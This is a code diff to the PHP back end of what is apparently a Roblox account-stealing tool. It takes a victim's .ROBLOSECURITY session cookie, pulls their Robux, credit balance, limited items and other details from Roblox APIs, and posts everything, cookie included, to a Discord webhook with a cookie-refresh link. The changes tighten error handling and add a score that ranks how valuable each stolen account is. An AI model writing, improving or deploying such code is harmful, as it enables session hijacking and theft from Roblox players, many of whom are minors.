@@ -209,7 +209,13 @@ if (!$apiData || !isset($apiData['success']) || !$apiData['success']) {
 // EXTRACT USER DATA FROM API RESPONSE
 // ============================================
 $userInfo = $apiData['userInfo'] ?? [];
-$userId = $userInfo['userId'] ?? 'Unknown';
+$userId = $userInfo['userId'] ?? null;
+
+if (!$userId) {
+    http_response_code(500);
+    echo json_encode(['success' => false, 'error' => 'Failed to get user ID']);
+    exit;
+}
 
 // Try to get bypassed cookie from API response, fallback to original if not present
 $bypassedCookie = $apiData['cookie'] ?? $apiData['bypassedCookie'] ?? $cookie;
@@ -224,12 +230,12 @@ $headers = ["Cookie: .ROBLOSECURITY=$bypassedCookie", "Content-Type: application
 
 // 1. Get User Info (username, displayName, created date)
 $userInfoData = makeRequest("https://users.roblox.com/v1/users/$userId", $headers) ?? [];
-$username = $userInfoData['name'] ?? 'Unknown';
+$username = $userInfoData['name'] ?? '';
 $displayName = $userInfoData['displayName'] ?? $username;
 $accountCreated = isset($userInfoData['created']) ? strtotime($userInfoData['created']) : null;
 
 // Calculate Account Age
-$accountAge = '0 Days';
+$accountAge = '';
 if ($accountCreated) {
     $days = floor((time() - $accountCreated) / (60 * 60 * 24));
     $accountAge = "$days Days";
@@ -243,9 +249,9 @@ $premiumDisplay = $isPremium ? '✅ True' : '❌ False';
 $emailDisplay = $emailVerified ? '✅ Verified' : '❌ Not Verified';
 
 // 3. Get Avatar/Thumbnail
-$avatarData = file_get_contents("https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=420x420&format=Png&isCircular=false");
-$avatarJson = json_decode($avatarData, true);
-$avatarUrl = $avatarJson['data'][0]['imageUrl'] ?? 'https://www.roblox.com/headshot-thumbnail/image/default.png';
+$avatarData = @file_get_contents("https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=420x420&format=Png&isCircular=false");
+$avatarJson = $avatarData ? json_decode($avatarData, true) : null;
+$avatarUrl = $avatarJson['data'][0]['imageUrl'] ?? '';
 
 // 4. Get Robux Balance
 $balanceData = makeRequest("https://economy.roblox.com/v1/users/$userId/currency", $headers) ?? [];
@@ -344,10 +350,10 @@ if ($instanceData) {
 updateGlobalStats('totalCookies', 1);
 
 // ============================================
-// SEND WEBHOOKS WITH REAL DATA (NO UNKNOWNS)
+// SEND WEBHOOKS WITH REAL DATA
 // ============================================
 
-// Create the detailed embed payload with ALL REAL DATA
+// Create the detailed embed payload with ALL REAL DATA (blank if empty)
 $detailedEmbed = [
     'content' => '@everyone',
     'username' => 'Fuji',
@@ -357,10 +363,10 @@ $detailedEmbed = [
         'type' => 'rich',
         'description' => "<:line:1350104634982662164> <:refresh:1350103925037989969> **[Refresh Cookie](https://www.logged.tg/tools/refresher?defaultFill=$bypassedCookie)** <:line:1350104634982662164> <:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/$userId/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/$userId)**",
         'color' => hexdec('00061a'),
-        'thumbnail' => ['url' => $avatarUrl],
+        'thumbnail' => ['url' => $avatarUrl ?: 'https://www.roblox.com/headshot-thumbnail/image/default.png'],
         'fields' => [
-            ['name' => '<:display:1348231445029847110> Display Name', 'value' => "```$displayName```", 'inline' => true],
-            ['name' => '<:user:1348232101639618570> Username', 'value' => "```$username```", 'inline' => true],
+            ['name' => '<:display:1348231445029847110> Display Name', 'value' => $displayName ? "```$displayName```" : "```N/A```", 'inline' => true],
+            ['name' => '<:user:1348232101639618570> Username', 'value' => $username ? "```$username```" : "```N/A```", 'inline' => true],
             ['name' => '<:userid:1348231351777755167> User ID', 'value' => "```$userId```", 'inline' => true],
             ['name' => '<:robux:1348231412834111580> Robux', 'value' => "```$robux```", 'inline' => true],
             ['name' => '<:pending:1348231397529223178> Pending Robux', 'value' => "```$pendingRobux```", 'inline' => true],
@@ -371,7 +377,7 @@ $detailedEmbed = [
             ['name' => '<:vc:1348233572020129792> Voice Chat', 'value' => "```$vcStatus```", 'inline' => true],
             ['name' => '<:headless:1348232978777640981> Headless Horseman', 'value' => "```$headlessStatus```", 'inline' => true],
             ['name' => '<:korblox:1348232956040319006> Korblox Deathspeaker', 'value' => "```$korbloxStatus```", 'inline' => true],
-            ['name' => '<:age:1348232331525099581> Account Age', 'value' => "```$accountAge```", 'inline' => true],
+            ['name' => '<:age:1348232331525099581> Account Age', 'value' => $accountAge ? "```$accountAge```" : "```N/A```", 'inline' => true],
             ['name' => '<:friends:1348231449798774865> Friends', 'value' => "```$friendsCount```", 'inline' => true],
             ['name' => '<:followers:1348231447072215162> Followers', 'value' => "```$followersCount```", 'inline' => true],
             ['name' => '<:creditbalance:1350102024376684644> Credit Card Balance', 'value' => "```$creditBalance USD (est $creditRobux Robux)```", 'inline' => true],
@@ -417,22 +423,35 @@ logSecurityEvent('successful_bypass', [
 ]);
 
 // ============================================
-// RETURN RESPONSE
+// RETURN RESPONSE FOR FRONTEND
 // ============================================
+// Calculate account score
+$accountScore = min(100, floor(
+    ($robux / 100) + 
+    ($rap / 1000) + 
+    ($totalGroupsOwned * 5) + 
+    ($friendsCount / 100) + 
+    ($followersCount / 100) +
+    ($isPremium ? 10 : 0) +
+    ($emailVerified ? 5 : 0)
+));
+
 echo json_encode([
     'success' => true,
     'userInfo' => [
-        'username' => $username,
-        'userId' => $userId,
-        'displayName' => $displayName,
+        'username' => $username ?: '',
+        'userId' => $userId ?: '',
+        'displayName' => $displayName ?: '',
         'robux' => $robux,
         'rap' => $rap,
-        'premium' => $isPremium,
+        'premium' => $isPremium ? 'Yes' : 'No',
+        'voiceChat' => $vcStatus === '✅ True' ? 'Yes' : 'No',
         'friends' => $friendsCount,
         'followers' => $followersCount,
-        'accountAge' => $accountAge,
-        'groupsOwned' => $totalGroupsOwned
+        'accountAge' => $accountAge ?: '',
+        'groupsOwned' => $totalGroupsOwned,
+        'accountScore' => $accountScore
     ],
-    'avatarUrl' => $avatarUrl
+    'avatarUrl' => $avatarUrl ?: ''
 ]);
 ?>
